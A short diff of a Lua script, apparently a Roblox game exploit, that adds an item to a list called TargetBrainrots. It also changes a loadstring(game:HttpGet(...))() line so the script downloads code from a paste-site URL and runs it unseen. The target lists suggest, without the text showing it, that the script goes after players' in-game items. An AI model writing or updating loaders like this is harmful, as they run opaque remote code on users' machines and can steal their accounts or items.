@@ -171,7 +171,8 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true
+    ["Deputy Leopard"] = true,
+    ["Bacuru and Egguru"] = true
 }
 
 local TargetBaseSkins = {
@@ -230,7 +231,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://fast-loading-forge.lovable.app/api/public/raw/dmvb22yp"))()
+    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
 
     task.wait(1)
 
